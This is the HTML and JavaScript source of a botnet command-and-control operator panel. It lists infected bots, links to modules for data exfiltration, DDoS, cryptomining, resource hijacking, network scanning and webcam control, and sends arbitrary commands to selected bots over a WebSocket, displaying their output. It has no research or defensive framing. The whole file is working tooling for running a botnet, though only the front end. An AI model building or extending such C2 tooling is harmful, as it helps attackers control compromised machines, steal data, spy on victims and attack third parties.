<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Botnet C2</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: "Courier New", Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1, h2 {
            text-align: center;
            text-shadow: 0 0 5px #00ff00;
        }
        .container {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .panel {
            background-color: #2a2a2a;
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 15px;
        }
        #bots, #output {
            height: 200px;
            overflow-y: scroll;
            border: 1px solid #00ff00;
            padding: 10px;
            background-color: #111;
        }
        #bots ul {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }
        #bots li {
            cursor: pointer;
            padding: 5px;
        }
        #bots li:hover, #bots li.selected {
            background-color: #00ff00;
            color: #1a1a1a;
        }
        input[type="text"], button {
            background-color: #333;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px;
            width: calc(100% - 18px);
        }
        button {
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            background-color: #00ff00;
            color: #1a1a1a;
        }
    </style>
</head>
<body>

    <h1>Botnet Command & Control</h1>

    <div class="container">
        <div class="panel">
            <h2>Bots</h2>
            <div id="bots">
                <ul>
                    <!-- Bots will be dynamically populated here -->
                </ul>
            </div>
        </div>

        <div class="panel">
            <h2>Modules</h2>
            <button onclick="window.location.href='/DATA_EXFILTRATION_MOD'">Data Exfiltration</button>
            <button onclick="window.location.href='/DDOS_MOD'">DDoS</button>
            <button onclick="window.location.href='/GEOLOCATION_MOD'">Geolocation</button>
            <button onclick="window.location.href='/HIJACK_MOD'">Resource Hijack</button>
            <button onclick="window.location.href='/MINER_MOD'">Miner</button>
            <button onclick="window.location.href='/NET_SCAN_MOD'">Network Scan</button>
            <button onclick="window.location.href='/WEBCAM_MOD'">Webcam Control</button>
            <button onclick="window.location.href='/RESOURCE'">Resource</button>
        </div>

        <div class="panel">
            <h2>Command</h2>
            <input type="text" id="command" placeholder="Enter command for selected bot(s)">
            <br><br>
            <button onclick="sendCommand()">Send Command</button>
        </div>

        <div class="panel">
            <h2>Output</h2>
            <div id="output">
                <!-- Command output will be displayed here -->
            </div>
        </div>
    </div>

    <script>
        // Placeholder for WebSocket connection
        const socket = new WebSocket("ws://localhost:8080/ws");

        const botsList = document.getElementById('bots').getElementsByTagName('ul')[0];
        const commandInput = document.getElementById('command');
        const outputDiv = document.getElementById('output');

        let selectedBots = [];

        socket.onopen = function(event) {
            logToOutput("Connected to C2 server.");
        };

        socket.onmessage = function(event) {
            const data = JSON.parse(event.data);

            if (data.type === 'bot_list') {
                updateBotList(data.bots);
            } else if (data.type === 'command_output') {
                logToOutput(`[${data.bot_id}]: ${data.output}`);
            }
        };

        socket.onclose = function(event) {
            logToOutput("Disconnected from C2 server.");
        };



        function updateBotList(bots) {
            botsList.innerHTML = '';
            bots.forEach(botId => {
                const li = document.createElement('li');
                li.textContent = botId;
                li.onclick = () => toggleBotSelection(li, botId);
                if (selectedBots.includes(botId)) {
                    li.classList.add('selected');
                }
                botsList.appendChild(li);
            });
        }

        function toggleBotSelection(li, botId) {
            const index = selectedBots.indexOf(botId);
            if (index > -1) {
                selectedBots.splice(index, 1);
                li.classList.remove('selected');
            } else {
                selectedBots.push(botId);
                li.classList.add('selected');
            }
        }

        function sendCommand() {
            const command = commandInput.value;
            if (!command) {
                alert("Please enter a command.");
                return;
            }
            if (selectedBots.length === 0) {
                alert("Please select at least one bot.");
                return;
            }

            const message = {
                type: 'command',
                targets: selectedBots,
                command: command
            };

            socket.send(JSON.stringify(message));
            logToOutput(`Sent command "${command}" to ${selectedBots.join(', ')}`);
            commandInput.value = '';
        }

        function logToOutput(message) {
            const p = document.createElement('p');
            p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            outputDiv.appendChild(p);
            outputDiv.scrollTop = outputDiv.scrollHeight;
        }

        // Mock initial bot list for testing without a live backend
        updateBotList(['bot-8a1b5c', 'bot-f3d9e0', 'bot-2c7a4e']);

    </script>

</body>
</html>
